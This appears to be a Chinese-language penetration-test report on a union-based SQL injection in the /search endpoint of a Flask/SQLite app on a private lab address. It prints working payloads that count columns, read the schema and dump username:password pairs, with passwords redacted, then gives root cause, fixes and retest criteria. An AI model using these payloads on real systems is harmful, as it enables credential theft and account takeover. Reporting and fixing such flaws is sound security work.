# SQL 注入专项漏洞报告

## 报告信息

| 项目 | 内容 |
|---|---|
| 测试目标 | `http://192.168.181.131:5000/` |
| 漏洞类型 | SQL Injection |
| 重点接口 | `GET /search?keyword=` |
| 数据库 | SQLite |
| 严重性 | 严重 |
| 测试结论 | 已确认可通过 Union-based SQL Injection 读取用户表结构、用户名、明文密码、邮箱和手机号 |

> 本报告只围绕 SQL 注入展开。为避免公开泄露真实账号口令，所有密码证据均使用 `REDACTED_*` 或 `<已脱敏>` 表示；实际测试中已确认可读取明文密码。

## 漏洞摘要

目标站点的用户搜索功能存在 SQL 注入。攻击者在 `keyword` 参数中插入单引号和 `UNION SELECT` 语句后，可以闭合原本的 `LIKE` 查询，并拼接任意查询结果到搜索结果表格中。

最关键的验证 payload 如下：

```text
x' union select 1,username||':'||password,3,email,phone from users--+
```

该 payload 可以让页面在“用户名”列中回显：

```text
admin:<已脱敏管理员密码>
alice:<已脱敏普通用户密码>
其他用户:<已脱敏密码>
```

这说明漏洞不只是“搜索条件绕过”，而是可以直接读取数据库中的密码字段。

## 漏洞位置

搜索接口：

```http
GET /search?keyword=<用户输入> HTTP/1.1
Host: 192.168.181.131:5000
Cookie: session=<已登录会话>
```

根据源码和实际响应可确认，后端 SQL 语句形态为：

```sql
SELECT * FROM users
WHERE username LIKE '%{keyword}%'
OR email LIKE '%{keyword}%'
```

其中 `{keyword}` 直接来自请求参数，没有经过参数化绑定。攻击者输入的单引号、`UNION SELECT`、注释符等会被 SQLite 当作 SQL 语法执行。

## 表结构确认

通过 `sqlite_master` 可以读取表结构：

```text
x' union select 1,name||':'||sql,3,'schema@example.com','13000000000'
from sqlite_master where type='table'--+
```

回显证据：

```text
users:CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE,
    password TEXT,
    email TEXT,
    phone TEXT
)
```

该表一共有 5 个字段：

```text
id, username, password, email, phone
```

这也解释了为什么后续 `UNION SELECT` 必须构造 5 列结果。

## 注入过程分析

### 闭合原字符串

原始查询片段为：

```sql
username LIKE '%{keyword}%'
```

当 `keyword` 为：

```text
x'
```

拼接后会变成：

```sql
username LIKE '%x'%'
```

第一个 `'` 已经闭合了原 SQL 字符串，后面就可以继续拼接 SQL 语句。

### 判断列数

错误 payload：

```text
x' union select 1,2,3,4--+
```

响应状态：

```text
HTTP 500
```

错误信息中出现：

```text
sqlite3.OperationalError:
SELECTs to the left and right of UNION do not have the same number of result columns
```

这说明原查询和注入查询列数不一致。由于原查询是 `SELECT * FROM users`，结合表结构可知需要 5 列。

### 构造 5 列可回显结果

验证 payload：

```text
x' union select 1,'MARKER_SQLI',3,'marker@example.com','13000000000'--+
```

搜索结果出现：

```text
ID: 1
用户名: MARKER_SQLI
邮箱: marker@example.com
手机: 13000000000
```

这证明攻击者可以控制 `UNION SELECT` 的回显内容，并且知道每一列会映射到页面中的哪个位置。

## 读取密码字段

核心 payload：

```text
x' union select 1,username||':'||password,3,email,phone from users--+
```

SQLite 中 `||` 是字符串拼接运算符，因此：

```sql
username||':'||password
```

会把用户名和密码拼成：

```text
用户名:密码
```

脱敏后的回显证据：

```text
搜索结果：

ID  用户名                              邮箱                    手机
1   admin:REDACTED_ADMIN_PASSWORD       admin@example.com       13800138000
1   alice:REDACTED_USER_PASSWORD        alice@example.com       13900139001
1   bob20260720:REDACTED_PASSWORD       bob20260720@example.com 13900000000
1   normal20260720:REDACTED_PASSWORD    normal20260720@example.com 13900000001
1   u1:REDACTED_PASSWORD                bad                    abc
```

实际测试中，`REDACTED_*` 位置为数据库中的明文密码。

## 读取 SQLite 版本

payload：

```text
x' union select 1,'sqlite_version:'||sqlite_version(),3,'version@example.com','13000000000'--+
```

回显：

```text
sqlite_version:3.46.1
```

该结果说明可以调用 SQLite 内置函数，并将函数结果显示到页面中。

## 注释符说明

payload 末尾使用：

```text
--+
```

原因：

```text
-- 
```

是 SQL 行注释。URL 查询参数中的 `+` 会被解析为空格，所以 `--+` 到达后端后等价于 `-- `。这样可以注释掉原 SQL 后面残留的：

```sql
%' OR email LIKE '%...%'
```

从而保证攻击者拼接的 SQL 正常执行。

## 可利用能力总结

经验证，该 SQL 注入至少具备以下能力：

| 能力 | 是否确认 | 证据 |
|---|---|---|
| 布尔条件绕过 | 已确认 | `' OR '1'='1` 可返回多条非预期用户记录 |
| UNION 回显 | 已确认 | `MARKER_SQLI` 可显示到搜索结果 |
| 判断列数 | 已确认 | 4 列 UNION 触发列数不一致错误 |
| 读取表结构 | 已确认 | 可从 `sqlite_master` 读取 `users` 建表语句 |
| 读取明文密码 | 已确认 | `username||':'||password` 可回显账号密码组合 |
| 调用内置函数 | 已确认 | 可回显 `sqlite_version()` |
| 错误信息泄露 | 已确认 | SQL 错误触发 Werkzeug Debugger 页面 |

## 影响评估

该漏洞影响非常严重，原因如下：

1. **直接泄露密码**：`users` 表中存在 `password TEXT` 明文字段，注入可直接读取。
2. **可接管账号**：拿到用户名和密码后，攻击者可以登录对应账户。
3. **管理员风险更高**：若管理员记录被读取，攻击者可进一步访问管理功能或敏感业务数据。
4. **可枚举数据库结构**：通过 `sqlite_master` 可了解表名、字段名和建表语句。
5. **错误页辅助攻击**：列数错误会返回详细 SQLite 错误和 Werkzeug Debugger 页面，降低攻击调试难度。
6. **可与其他弱点串联**：如果系统还存在默认口令、固定 Session 密钥或调试模式，整体攻击链会更短。

## 根因

根因是把用户输入直接拼接进 SQL：

```python
sql = f"SELECT * FROM users WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'"
cursor.execute(sql)
```

正确做法应该是把用户输入作为“数据”绑定，而不是作为 SQL 语句的一部分拼接。

## 修复建议

### 使用参数化查询

错误写法：

```python
sql = f"SELECT * FROM users WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'"
cursor.execute(sql)
```

正确写法：

```python
like_keyword = f"%{keyword}%"
cursor.execute(
    "SELECT id, username, email, phone FROM users WHERE username LIKE ? OR email LIKE ?",
    (like_keyword, like_keyword),
)
```

这样即使用户输入：

```text
x' union select 1,username||':'||password,3,email,phone from users--+
```

数据库也只会把它当作普通字符串，不会执行其中的 `UNION SELECT`。

### 不返回敏感字段

搜索接口不应使用：

```sql
SELECT *
```

应只选择业务必要字段：

```sql
SELECT id, username, email, phone FROM users ...
```

不要在搜索接口返回 `password` 或 `password_hash`。

### 密码哈希化

原表结构存在：

```sql
password TEXT
```

应改为：

```sql
password_hash TEXT NOT NULL
```

密码存储必须使用安全哈希算法，例如 Werkzeug 的 `generate_password_hash`，登录时使用 `check_password_hash` 校验。即使未来再次出现读取类漏洞，也不应直接泄露原始密码。

### 关闭调试错误页

生产环境必须关闭 Flask/Werkzeug debug：

```python
app.run(debug=False)
```

并统一返回通用错误页面，不把 SQL 错误、Traceback、调试器信息返回给前端。

## 复测标准

修复后应满足：

1. 输入 `' OR '1'='1` 不返回额外用户。
2. 输入 `x' union select 1,'MARKER_SQLI',3,'marker@example.com','13000000000'--+` 不回显 `MARKER_SQLI`。
3. 输入 `x' union select 1,username||':'||password,3,email,phone from users--+` 不回显任何 `用户名:密码`。
4. 输入 `x' union select 1,2,3,4--+` 不返回 SQLite/Werkzeug 调试错误页。
5. 搜索接口只返回必要字段，不包含密码字段。
6. 数据库中不再保存明文密码。

## 结论

`/search` 接口存在可稳定利用的 Union-based SQL 注入。攻击者可以通过 5 列 `UNION SELECT` 对齐原查询结果，并利用 SQLite 的 `||` 拼接操作直接读取 `username:password`。由于数据库保存明文密码，该漏洞可导致账号密码批量泄露，风险等级应定为严重。
